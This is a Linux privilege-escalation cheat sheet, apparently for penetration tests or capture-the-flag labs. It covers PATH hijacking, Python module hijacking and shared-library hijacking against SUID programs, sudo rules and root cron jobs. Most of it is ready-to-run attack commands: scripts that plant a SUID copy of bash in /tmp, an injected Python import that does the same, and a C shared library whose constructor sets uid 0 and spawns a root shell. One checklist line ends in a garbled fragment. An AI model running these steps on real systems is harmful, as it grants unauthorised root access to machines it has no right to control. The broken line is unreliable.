# Linux privesc: PATH and library hijacking

## Find a program called by bare name
THE-PROGRAM is a SUID program, a script sudo -l allows, or one a root job runs.
strings THE-PROGRAM | less
ltrace THE-PROGRAM 2>&1 | grep -E 'system|exec|popen'
cat THE-SCRIPT-PATH
- [ ] A call such as system("service apache2 start"), or tar where /usr/bin/tar belongs
- [ ] An import in a Python script root runs: the Python section
- [ ] A library it cannot find: the shared library section

## PATH hijack
Mine, named for the program it calls, here service:
printf '#!/bin/bash\ncp /bin/bash /tmp/rootbash\nchmod +s /tmp/rootbash\n' > /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH
THE-PROGRAM
/tmp/rootbash -p
- [ ] Through sudo, secure_path resets PATH: my PATH reaches the program only when sudo -l shows no secure_path
- [ ] rootbash is mine, not root's: the program never called setuid(0), and sh dropped root before it ran mine
- [ ] No root from -p: /tmp is mounted nosuid, so the copy goes to /var/tmp instead

## A folder I can write in a root job's PATH
grep PATH /etc/crontab
find / -writable -type d 2>/dev/null | grep -vE '^/(proc|sys|dev|run)'
- [ ] A folder I can write that comes before the real program's: a script of the same name there, as above

## Python library hijack
Root runs a Python script: what it imports, and where Python looks, in order.
grep -E '^import|^from' THE-SCRIPT-PATH
python3 -c 'import sys; print("\n".join(sys.path))'
python3 -c 'import THE-MODULE; print(THE-MODULE.__file__)'
ls -la THE-MODULE-PATH
- [ ] The module's file writable: my line at its top
- [ ] The script's own folder writable: it comes first in sys.path, so my module of the same name goes there
- [ ] The module's folder writable but not the file: the original moved aside and mine put in its place
A module of the same name, in THE-FOLDER:
echo 'import os; os.system("cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash")' > THE-FOLDER/THE-MODULE.py
With SETENV in sudo -l, or PYTHONPATH in env_keep, the module in /dev/shm instead:
sudo PYTHONPATH=/dev/shm THE-ALLOWED-COMMAND
/tmp/rootbash -p

## Shared library hijack
ldd THE-PROGRAM
strace THE-PROGRAM 2>&1 | grep -iE 'open.*\.so.*(no such|ENOENT)'
readelf -d THE-PROGRAM | grep -iE 'rpath|runpath'
- [ ] A library not found, in a folder I can write: THE-FOLDER, and THE-LIBRARY is its name without .so
- [ ] An RPATH or RUNPATH that names a folder I can write: the same
```
cat > /tmp/lib.c <<'EOF'
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) static void pe(void) {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
EOF
gcc -shared -fPIC -o THE-FOLDER/THE-LIBRARY.so /tmp/lib.c
THE-PROGRAM
```
- [ ] LD_LIBRARY_PATH and LD_PRELOAD are ignored for a SUID program; through sudo with env_keep: :Pb sudo

## Afterwards
rm -f /tmp/rootbash /tmp/service /tmp/lib.c
- [ ] A moved module or library put back
